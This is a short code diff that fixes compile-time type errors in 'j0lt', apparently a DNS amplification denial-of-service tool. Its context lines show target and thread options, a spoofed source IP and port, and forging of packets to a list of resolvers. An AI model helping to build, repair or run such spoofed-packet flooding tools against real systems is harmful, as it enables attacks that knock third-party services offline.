@@ -221,7 +221,7 @@ Result_T parse_opts(JoltOptions *opts, int argc, const char **argv) {
 
   Result_T result = RESULT_SUCCESS;
 
-  int opt = getopt(argc, argv, g_args);
+  int opt = getopt(argc, (char *const *)argv, g_args);
   char *endptr = NULL;
   do {
     switch (opt) {
@@ -263,7 +263,7 @@ Result_T parse_opts(JoltOptions *opts, int argc, const char **argv) {
       default:  // invalid option
         err_exit("Usage: ./j0lt -t target -p port -m nthreads [OPTION]...\n");
     }
-  } while ((opt = getopt(argc, argv, g_args)) != -1);
+  } while ((opt = getopt(argc, (char *const *)argv, g_args)) != -1);
 
   if (opts->nthreads == 0 || opts->spoof_port == 0 || opts->spoof_ip == 0)
     err_exit("Usage: ./j0lt -t target -p port -m nthreads [OPTION]...\n");
@@ -352,7 +352,8 @@ int main(int argc, char **argv) {
       for (i = 0; isdigit(lineptr[i]); i++);
       if (lineptr[i] != '.')  // check ip4
         continue;
-      char *resolvip = inet_addr(lineptr);
+
+      in_addr_t resolvip = inet_addr(lineptr);
       if (resolvip == 0) continue;
       szpayload = forge_j0lt_packet(payload, htonl(resolvip),
                                     htonl(opts.spoof_ip), opts.spoof_port);
